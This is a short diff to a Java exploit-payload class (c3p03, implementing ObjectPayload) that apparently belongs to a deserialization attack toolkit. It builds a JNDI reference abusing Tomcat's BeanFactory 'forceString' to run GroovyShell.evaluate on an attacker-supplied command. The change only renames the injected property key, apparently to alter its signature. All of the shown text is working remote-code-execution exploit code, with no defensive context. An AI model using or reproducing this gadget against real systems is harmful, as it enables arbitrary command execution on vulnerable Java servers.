@@ -43,8 +43,8 @@ public class c3p03 implements ObjectPayload<Object> {
 
         public Reference getReference() throws NamingException {
             ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
-            ref.add(new StringRefAddr("forceString", "nu1r=evaluate"));
-            ref.add(new StringRefAddr("nu1r", "'" + cmd + "'.execute()"));
+            ref.add(new StringRefAddr("forceString", "QI4L=evaluate"));
+            ref.add(new StringRefAddr("QI4L", "'" + cmd + "'.execute()"));
             return ref;
         }
 
